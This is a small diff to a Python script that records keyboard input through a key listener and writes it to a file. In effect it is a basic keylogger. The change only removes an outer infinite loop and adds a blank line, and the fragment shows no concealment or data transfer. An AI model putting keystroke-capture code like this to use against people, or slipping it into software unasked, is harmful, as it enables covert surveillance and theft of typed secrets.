@@ -16,6 +16,7 @@ def write(key):
         file.close()
 
 
+
 # defines letters
 def is_letter(value):
     # universal variables for alphabet letters
@@ -41,7 +42,6 @@ def on_press(key):
 
 # Using Listener, everytime on_press is activated function write activates
 # This also joins the characters
-while True:
-    with Listener(on_press=on_press, on_release=write) as listener:
-        listener.join()
+with Listener(on_press=on_press, on_release=write) as listener:
+    listener.join()
 
